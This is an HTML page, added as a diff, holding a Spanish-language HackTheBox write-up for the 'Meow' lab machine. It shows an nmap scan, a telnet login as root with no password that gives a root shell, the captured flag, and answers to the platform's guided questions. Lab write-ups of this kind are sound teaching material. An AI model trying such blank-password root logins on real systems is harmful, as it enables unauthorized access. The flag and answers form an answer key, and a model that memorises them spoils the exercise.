@@ -1,0 +1,109 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Meow HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/sp/meow.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Meow HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Meow de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Meow de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Meow HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Meow HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Meow de la plataforma de HackTheBox","headline":"Writeup Meow HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Meow HackTheBox</h1>
+          <p>Resolución de la máquina Meow de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.129.53.139
+Nmap scan report for 10.129.53.139
+PORT   STATE SERVICE
+23/tcp open  telnet</span>
+</code></pre></div></div>
+
+<div><p>Solo esta abierto telnet, nos muestra el login que nos pide un usuario como cual autenticarnos, si intentamos entrar como root no nos pide contraseña y nos da una shell, podemos leer la flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ telnet </span><span class="p">10.129.53.139
+Trying 10.129.53.139...
+Connected to 10.129.53.139.
+Escape character is '^]'.
+
+  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
+  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
+  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█
+
+
+Meow login: </span><span class="kd">root</span><span class="p">
+
+</span><span class="s2">root@Meow</span><span class="p">:</span><span class="na">~</span><span class="p"># id
+uid=0(root) gid=0(root) groups=0(root)
+</span><span class="s2">root@Meow</span><span class="p">:</span><span class="na">~</span><span class="p"># hostname -I
+10.129.53.139 dead:beef::250:56ff:fe96:54f 
+</span><span class="s2">root@Meow</span><span class="p">:</span><span class="na">~</span><span class="p"># cat flag.txt
+b40abdfe23665f766f9c61ecba8a4c19
+</span><span class="s2">root@Meow</span><span class="p">:</span><span class="na">~</span><span class="p">#</span>
+</code></pre></div></div>
+
+<div><p>Vamos con las preguntas que nos pide la web de htb para pwnear la máquina</p></div>
+<blockquote><li><strong>What does the acronym VM stand for?</strong></li>
+<ul><p></p><li>Virtual Machine</li></ul></blockquote><br>
+
+<blockquote><li><strong>What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It's also known as a console or shell.</strong></li>
+<ul><p></p><li>Terminal</li></ul></blockquote><br>
+
+<blockquote><li><strong>What service do we use to form our VPN connection into HTB labs?</strong></li>
+<ul><p></p><li>openvpn</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the abbreviated name for a 'tunnel interface' in the output of your VPN boot-up sequence output?</strong></li>            
+<ul><p></p><li>tun</li></ul></blockquote><br>
+
+<blockquote><li><strong>What tool do we use to test our connection to the target with an ICMP echo request?</strong></li>
+<ul><p></p><li>ping</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the name of the most common tool for finding open ports on a target?</strong></li>
+<ul><p></p><li>nmap</li></ul></blockquote><br>
+
+<blockquote><li><strong>What service do we identify on port 23/tcp during our scans?</strong></li>
+<ul><p></p><li>telnet</li></ul></blockquote><br>
+
+<blockquote><li><strong>What username is able to log into the target over telnet with a blank password?</strong></li>
+<ul><p></p><li>root</li></ul></blockquote><br>
+
+<blockquote><li><strong>Submit root flag</strong></li>
+<ul><p></p><li>b40abdfe23665f766f9c61ecba8a4c19</li></ul></blockquote><br>
+
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
